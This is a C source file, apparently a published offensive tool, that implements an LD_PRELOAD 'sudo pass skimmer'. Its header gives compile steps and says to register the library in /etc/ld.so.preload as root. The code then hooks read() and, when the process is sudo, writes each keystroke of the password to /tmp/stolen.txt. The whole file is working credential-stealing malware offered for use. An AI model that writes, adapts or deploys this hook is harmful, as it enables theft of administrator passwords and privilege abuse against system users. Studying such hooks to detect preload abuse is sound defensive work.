
/* 
 *                           LD_PRELOAD Sudo Pass Skimmer
 *
 *                                 -- oxagast --
 *
 * oxagast@oxasploits.com
 * https://oxasploits.com
 * The funtional equivilent of a DLL jack, but for Linux. LDPL jacking?
 * Compile using: gcc -fPIC -shared -ldl -Wall sudo_lib_hook.c -o
 * /tmp/cap_pass.so Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need
 * to do this as root). Then sudo su. Log back out of the shell and check
 * /tmp/stolen.txt.
 * /tmp/stolen.txt should now contain the passphrase you entered.
 *
 *
 * immense thanks to vesteria for the general idea of skimming passwords!
 * enrmous thanks to blissful boy for the file size func!
 * gargantuan thanks to atdma for catching the lack of void* cast!
 * and a collossal thanks to everyone who has found this useful!
 * <3 you guys
 *
 */


#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define MAX_FILE_SIZE 64
#define MAX_PROCESS_NAME_LEN 256

//pointer to real read func (needs to be PIC)
static ssize_t(*original_read) (int fd, void *buf, size_t count) = NULL;

// get file size in a robust way
long long getfsize(const char *fn) {
  struct stat st;
  if(stat(fn, &st) != 0) {
    return -1;
  }
  off_t fs = st.st_size;
  return (long long)fs;
}

int amsudo() {
  char process_name[MAX_PROCESS_NAME_LEN] = { 0 };
  FILE *fp_comm = fopen("/proc/self/comm", "r");
  fgets(process_name, sizeof(process_name), fp_comm);
  process_name[strcspn(process_name, "\n")] = '\0';
  fclose(fp_comm);
  return strcmp(process_name, "sudo");
}

ssize_t read(int fd, void *buf, size_t count) {
  if(original_read == NULL) {
    original_read = dlsym(RTLD_NEXT, "read");
    if(original_read == NULL) {
      return -1;
    }
  }
  // check if the current process is sudo
  if(amsudo() == 0) {
    const char stealfile[] = "/tmp/stolen.txt";
    // make sure our file isn't overgrown
    if(getfsize(stealfile) >= MAX_FILE_SIZE) {
      return original_read(fd, buf, count);
    }
    // this helps us isolate the characters from term
    // only (artifact of sudo src)
    if(count == 1) {
      FILE *stealer = fopen(stealfile, "a");
      // we need to cast buf
      fprintf(stealer, "%.1s", (char *)buf);
      fclose(stealer);
    }
  }
  return original_read(fd, buf, count);
}
